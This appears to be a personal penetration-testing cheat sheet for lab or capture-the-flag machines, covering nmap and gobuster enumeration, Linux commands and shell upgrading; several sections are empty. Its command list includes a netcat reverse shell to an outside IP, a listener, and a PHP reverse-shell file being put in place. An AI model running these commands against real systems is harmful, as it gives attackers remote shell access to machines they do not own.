# Enumuration

## Check List
* Run *nmap* to enumerate the open ports
* Run *nmap* using the vulnerability scripts to find available vulnerabilities for the target.
* If the target has an active webserver (*80/443/8080*), enumerate the webserver by visiting the server itself and running *gobuster*.
  - If you found any info on the site (i.e. File Sharing Application X 2.22) search for a CVE for this system.
* If the target has SMB (*139/445*), check if it's vulnerable to *Eternal Blue CVE* (*nmap* vulnerability scripts checks for it)
* Run other enum tools 

## NMAP
* *sudo nmap -sC -sV -O -oA \<Output Directory\> \<IP Address\>* - Basic nmap scan for the top ports only. (-sC for default scripts, -sV for version enum, -O for OS enum)
* *sudo nmap -sC -sV -O -p- -oA \<Output Directory\> \<IP Address\>* - Scan for all the ports.
* *nmap --script vuln -oA \<Output Directory\> \<IP Address\>* - Run vulnerability scripts on the target.
* *nmap -sU -oA \<Output Directory\> \<IP Address\>* - Runs a scan for the top UDP ports.

## Fuzzing
* *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\>* - You can use another wordlist as well.
* *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\> -f* - (-f) is used when the server treats /cgi-bin and /cgi-bin/ differently.
* gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\>/<Directory>/ -x sh,cgi - Searches for files in a directory and (-x) is used to specify the extension.

## Important Tools
### Enumeration/Recon
* [Nmap](https://nmap.org/): A tool that scans a target and provides a list of the open ports, it can also run many scripts that can enumerate the version, OS, and run multiple checks on known CVEs.
* [Gobuster](https://github.com/OJ/gobuster): A tool that's used for fuzzing a webserver to find directories, files, etc..


# Initial Access
## Privilege Escalation

## Reverse Shells 

## How to brute force

## How to break hash

## Useful Commands (Linux)
* grep/search/etc..
* sudo -l
* whoami
* id
* uname -a
* sudo -i -u scriptmanager
* locate password | grep john
* cp php-reverse-shell.php artisan
* nc -nlvp 4444
* nc -nv 10.10.14.30 4444 -e /bin/sh (Target machine to send a reverse shell)
* chmod +x \<File Name\>
* searchsploit --id httpd


## Useful Commands (Windows)
* grep/search/etc..
* sudo -l
* 
## Useful Information

### Useful Information (General)
* Even if you don't have access to a directory you might have access to the files in that directory. (When you get a 403, try fuzzing inside the directory)
* Some servers treat /Directory and /Directory/ differently, the first one might not be accessible but the second might be, make sure to check both when fuzzing.


### Useful Information (Linux)
* Crontab are a list of commands in Linux that are executed regularly. Making it a useful persistent technique and privilege escalation technique.
* If a reverse shell is executed by a specific user, the shell granted will be of that user's privilege. (i.e. if you executed a shell as root, you will get root shell)
* Sometimes even if you can execute a file, you can read/write to it.
* Sometimes even if you aren't root, you can run specific commands with root privilege.

### Useful Information (Windows)


## Injection Payloads

### SQL

### Command Injection

### XSS


## How to upgrade a shell to a fully interactive TTY.
* *python -c 'import pty; pty.spawn("/bin/bash")'* - Spwans */bin/bash* using Python’s PTY module
* *Ctrl + Z* - Background the shell.
* *stty raw -echo && fg* - Upgrade the local terminal with *stty* and foreground the reverse shell.
* *Double Enter*

## General Major Vulnerabilities
* Eternal Blue (SMB - Windows) (Privileged Access)
* Dirty Cow (Linux - Privilege Escalation)
* Valentine (SSH) (Memory Data Dump)


* [PEASS-ng](https://github.com/carlospolop/PEASS-ng): A tool that tries to find privilege escalation techniques in a machine, can be run after gaining initial access as it needs to be run from the target machine.
